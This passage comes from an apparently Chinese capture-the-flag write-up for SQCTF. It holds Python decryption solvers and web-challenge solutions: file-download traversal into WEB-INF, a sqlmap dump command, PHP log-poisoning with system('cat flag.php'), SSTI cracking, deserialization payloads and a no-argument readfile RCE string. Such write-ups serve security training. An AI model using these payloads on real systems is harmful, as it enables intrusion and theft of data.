class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (v0 + s) ^ ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (v1 + s) ^ ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        s = (s - delta) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_padding</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据 sub_102 的处理，将 data 按照最后一个字符的数值去掉对应数量的填充。</span></span><br><span class="line"><span class="string">    例如，若最后一个字节的值为 n，则有效数据长度为 len(data)-n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># data 是字节数组，取最后一个字节做为填充数</span></span><br><span class="line">    pad = data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> pad &gt; <span class="number">0</span> <span class="keyword">and</span> pad &lt;= <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">return</span> data[:-pad]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_transform</span>(<span class="params">data, key_val</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对 data 中的每个字节进行 XOR 变换。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(b ^ key_val <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 原始硬编码的十六进制字符串</span></span><br><span class="line">    hex_string = <span class="string">&quot;7f1f17fd8e51aa660b8036914a4950e8fa8078a2ef33608650fb7a845226f2d1&quot;</span></span><br><span class="line">    <span class="comment"># 转换为二进制数据（字节数组）</span></span><br><span class="line">    data = <span class="built_in">bytearray</span>.fromhex(hex_string)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># TEA 密钥（注意：负数转化为对应的无符号 32 位数）</span></span><br><span class="line">    key = [</span><br><span class="line">        <span class="number">0x12345678</span>,           <span class="comment"># 305419896</span></span><br><span class="line">        <span class="number">0x87654321</span>,           <span class="comment"># 2271560481 (原 -2023406815 转无符号)</span></span><br><span class="line">        <span class="number">0xABCDEF98</span>,           <span class="comment"># 2882400152 (原 -1412567144 转无符号)</span></span><br><span class="line">        <span class="number">2566839482</span>            <span class="comment"># 4294967296 - 1728127814 = 2566839482</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分块解密，每 8 字节解密一次</span></span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">        block = data[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="comment"># 如果不足8个字节则不处理（或补足，视实际加密时填充方式而定）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(block) &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        v0, v1 = tea_decrypt(block, key)</span><br><span class="line">        <span class="comment"># 将解密后的整数以小端格式转换回字节并追加到 decrypted 中</span></span><br><span class="line">        decrypted.extend(struct.pack(<span class="string">&quot;&lt;II&quot;</span>, v0, v1))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用 sub_102 的处理：根据最后一个字节（padding 数量）截断字符串</span></span><br><span class="line">    decrypted = remove_padding(decrypted)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 最后对每个字节进行 XOR 操作（key = 22）</span></span><br><span class="line">    final = xor_transform(decrypted, <span class="number">22</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 输出最终结果（假设为 UTF-8 编码的文本）</span></span><br><span class="line">        <span class="built_in">print</span>(final.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># 若解码失败则以十六进制形式显示</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解密后的数据非文本，十六进制表示：&quot;</span>, final.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># SQCTF&#123;nihaobuhaobuhaoxixi&#125;</span></span><br></pre></td></tr></table></figure><h3 id="人生自古谁无死"><a href="#人生自古谁无死" class="headerlink" title="人生自古谁无死"></a>人生自古谁无死</h3><p>无壳，直接扔IDA</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-38.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-39.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-40.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-41.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-42.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-43.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">g_obf2 = [<span class="number">0xDE</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xEF</span>]</span><br><span class="line">key = <span class="built_in">bytes</span>([(g_obf2[i % <span class="number">4</span>] ^ (i + <span class="number">17</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成Nonce（12字节）</span></span><br><span class="line">nonce = <span class="built_in">bytes</span>([<span class="number">17</span> * j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext1 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ChaCha20解密</span></span><br><span class="line">cipher1 = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">plaintext1 = cipher1.decrypt(ciphertext1)</span><br><span class="line"></span><br><span class="line">cipher2 = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">plaintext2 = cipher2.decrypt(ciphertext2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag 1:&quot;</span>, plaintext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag 2:&quot;</span>, plaintext2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag 1: b&#x27;\xab\xd1k\xdb)\xa1\xd1\xfe\x01\x05\x7f\tj\xfb\xccX|\xc0\xde&#125;\x185\xb3f\x8a9\x89\xf5\xf3\x93&#x27;</span></span><br><span class="line"><span class="comment"># Flag 2: b&#x27;SQCTF&#123;real_chacha20_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="不劳春风解我忧"><a href="#不劳春风解我忧" class="headerlink" title="不劳春风解我忧"></a>不劳春风解我忧</h3><p>无壳，直接扔IDA<br><img src="https://img.beiko.top/blog/2025/4/28/image-44.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-45.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-46.png"></p><p>一个XXTEA算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xxtea_decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    XXTEA 解密算法实现</span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">      v: list[int]，待解密的数据（32 位无符号整数列表）</span></span><br><span class="line"><span class="string">      k: list[int]，密钥（4 个32位无符号整数）</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">      解密后的 32 位整数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    sum_val = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">while</span> sum_val != <span class="number">0</span>:</span><br><span class="line">        e = (sum_val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % n]</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 与加密中相反的逆向操作</span></span><br><span class="line">            f = (((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum_val ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z))</span><br><span class="line">            v[p] = (v[p] - f) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uint32_array_to_bytes</span>(<span class="params">arr, length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将32位无符号整数数组转换成 bytes 字节串（little-endian），</span></span><br><span class="line"><span class="string">    并截取指定长度</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> arr:</span><br><span class="line">        b.extend(x.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b[:length])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 固定的密钥，与 C 代码中的完全一致</span></span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x9ABCDEF0</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x87654321</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 给定密文（加密后目标结果），注意需要转换为无符号 32 位整数表示：</span></span><br><span class="line">    <span class="comment"># -1888188061 对应为: (-1888188061) &amp; 0xFFFFFFFF</span></span><br><span class="line">    <span class="comment"># -887253336  对应为: (-887253336) &amp; 0xFFFFFFFF</span></span><br><span class="line">    cipher0 = (-<span class="number">1888188061</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    cipher1 = (-<span class="number">887253336</span>)  &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    cipher = [cipher0, cipher1]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对密文进行逆向 XXTEA 解密</span></span><br><span class="line">    decrypted = xxtea_decrypt(cipher.copy(), key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据 C 代码，原始数据是存储在 8 字节内（2 个32位整数），</span></span><br><span class="line">    <span class="comment"># 如果末尾有补 0，则移除尾部的多余的0字节</span></span><br><span class="line">    plaintext_bytes = uint32_array_to_bytes(decrypted, <span class="number">8</span>).rstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext_str = plaintext_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        plaintext_str = plaintext_bytes.decode(<span class="string">&#x27;latin-1&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, plaintext_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># Decrypted flag: tyandctf</span></span><br></pre></td></tr></table></figure><p>flag为：<code>SQCTF&#123;tyandctf&#125;</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h3><p><code>Ctrl+U</code>查看源代码，看到了获得flag的请求函数</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-47.png"></p><p>传参2048就能获得flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-48.png"></p><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p><img src="https://img.beiko.top/blog/2025/4/28/image-49.png"></p><h3 id="File-download"><a href="#File-download" class="headerlink" title="File_download"></a>File_download</h3><p>随便访问一个路径查看报错信息可以看到是tomcat的站点</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-50.png"></p><p>根据提示传对应的参数，发现可以读取当前目录下的文件，但是不能直接读flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-51.png"></p><p><code>GET传参会显示在页面，POST则直接下载文件</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-52.png"></p><p>参数读取<code>tomcat</code>的配置文件<code>WEB-INF/web.xml</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-53.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-54.png"></p><p>从上面的信息来看知道源码<code>class</code>文件位置在<code>WEB-INF/classes/com/ctf/flag/FlagManager.class</code></p><p>POST请求：<code>/DownloadServlet?filename=WEB-INF/classes/com/ctf/flag/FlagManager.class</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 逆向该class文件获取里面的key</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">110</span>, <span class="number">107</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">103</span>, <span class="number">185</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">187</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">103</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">187</span>, <span class="number">99</span>, <span class="number">183</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">102</span>, <span class="number">106</span>, <span class="number">106</span>, <span class="number">188</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">111</span>, <span class="number">188</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    temp = k ^ <span class="number">0x30</span></span><br><span class="line">    c = temp -<span class="number">38</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># 85caad1c-33e3-0bc1-6d5e-a73b044f7d9f</span></span><br></pre></td></tr></table></figure><h3 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h3><p>第一关：直接访问<code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;/atc1acrd.html&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">然后</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;Ctrl+U&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">查看源码</font></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-55.png"></p><p>第二关：<code>/atc2cnzd.php</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-56.png"></p><p>第三关：<code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgb(245, 245, 220);&quot;&gt;/atc3oklm.php&lt;/font&gt;</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-57.png"></p><p>第四关：<code>/atc4zztg.php</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-58.png"></p><p>第五关：<code>/atc5uupl.php</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-59.png"></p><p>第六关：<code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgb(245, 245, 220);&quot;&gt;/atc6ertg.php&lt;/font&gt;</code></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 220);">查看页面源码找到隐藏的按钮</font></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-60.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-61.png"></p><p>第七关：<code>/atc7wedf.php</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-62.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-63.png"></p><p>合并flag提交即可</p><h3 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h3><p>sqlmap直接梭哈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://challenge.qsnctf.com:<span class="number">30726</span>/?<span class="built_in">id</span>=<span class="number">1</span> -D ctf -T flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-64.png"></p><h3 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a>baby include</h3><p>先用<code>Yakit</code>访问一下<code>/&lt;?php system(&#39;cat flag.php&#39;) ?&gt;</code>（直接访问会把特殊符号编码）</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-65.png"></p><p>然后用<code>file://</code>协议读取nginx的日志文件<code>/var/log/nginx/access.log</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-66.png"></p><h3 id="Input-a-number"><a href="#Input-a-number" class="headerlink" title="Input a number"></a>Input a number</h3><p><img src="https://img.beiko.top/blog/2025/4/28/image-67.png"></p><h3 id="唯一"><a href="#唯一" class="headerlink" title="唯一"></a>唯一</h3><p>先用<code>arjun</code>fuzzc出参数<code>note</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-68.png"></p><p>出来之后就是个简单的SSTI，用fenjing打就行</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-69.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack -u http://challenge.qsnctf.com:32027/ --inputs note --method GET</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-70.png"></p><h3 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h3><p>用Yakti直接传</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-71.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-72.png"></p><h3 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hhh</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yyy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allowed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$allowed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;allowed = <span class="variable">$allowed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;allowed) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Access Denied!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造目标 yyy 对象（延迟返回 flag.php）</span></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yyy</span>(<span class="string">&quot;flag.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造主对象 hhh</span></span><br><span class="line"><span class="variable">$exploit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hhh</span>(<span class="variable">$file</span>, <span class="string">&quot;GET_FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exploit</span>);</span><br><span class="line"><span class="comment">// O:3:&quot;hhh&quot;:2:&#123;s:4:&quot;file&quot;;O:3:&quot;yyy&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;allowed&quot;;b:1;&#125;s:7:&quot;content&quot;;s:8:&quot;GET_FLAG&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-73.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-74.png"></p><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pswd</span> = <span class="string">&#x27;sunshine&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;pswd = <span class="string">&#x27;escaping&#x27;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;test&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-75.png"></p><h3 id="无参之舞"><a href="#无参之舞" class="headerlink" title="无参之舞"></a>无参之舞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?exp=<span class="keyword">echo</span>%<span class="number">20</span>readfile(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://www.freebuf.com/articles/web/261800.html">https://www.freebuf.com/articles/web/261800.html</a></p><p>多访问几次就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-76.png"></p><h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?param1[]=a&amp;param2[]=b</span><br><span class="line">POST: payload=<span class="title class_">TYctf</span>::<span class="variable constant_">getKey</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-77.png"></p><h3 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h3><p>这题只要俩秒内计算页面内的算式即可获得flag，用脚本去算就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 